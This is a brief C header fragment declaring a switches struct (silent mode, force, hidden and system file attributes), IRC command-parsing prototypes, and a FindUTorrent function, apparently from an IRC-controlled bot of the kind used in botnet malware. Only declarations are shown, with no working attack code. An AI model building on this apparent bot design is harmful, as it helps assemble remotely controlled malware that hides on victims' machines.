
typedef struct PARAMS
{
	BOOL silent;
	BOOL halfsilent;
	BOOL verbose;
	BOOL stop;
	BOOL force;
	BOOL replace_underscores;
	char replace_char;
	BOOL createwait;
	BOOL overwrite;
	BOOL attrib_system;
	BOOL attrib_hidden;
	BOOL attrib_readonly;
	BOOL attrib_normal;
} SWITCHES;

int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic=FALSE);
int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic=FALSE);

HWND FindUTorrent( );
